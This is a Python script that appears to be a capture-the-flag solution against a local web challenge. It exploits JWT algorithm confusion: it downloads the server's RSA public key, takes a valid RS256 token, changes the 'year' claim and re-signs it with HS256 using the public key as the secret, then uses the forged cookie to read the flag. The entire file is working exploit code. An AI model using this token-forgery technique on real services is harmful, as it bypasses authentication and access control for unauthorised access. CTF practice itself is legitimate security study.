import requests
import random

# jwt.py should be in provide, so we can just use the one in server files
import server.jwt

URL = "http://localhost:5000/"

# eventually, we want to trick the server into reading our HS256-encrypted cookie with the RS256 secret
# so we need the public key and a valid cookie
key = requests.get(URL + "static/public_key.pem").text.encode()
cookie = requests.post(URL + "register", data={"username": hex(random.randrange(9999)), "year": "1980"}).cookies['token'].encode()

# now, make a new cookie, encryped with HS256 and the public key
payload = server.jwt.decode(cookie, key, algorithms=["RS256"])
payload["year"] = "1970"
new_token = server.jwt.encode(payload, key, algorithm="HS256")

# then send the new cookie to the webpage and print the flag
page = requests.get(URL + "retro", cookies={"token": new_token.decode("utf-8")}).text
print(page[page.index("tjctf") : page.index("}") + 1])
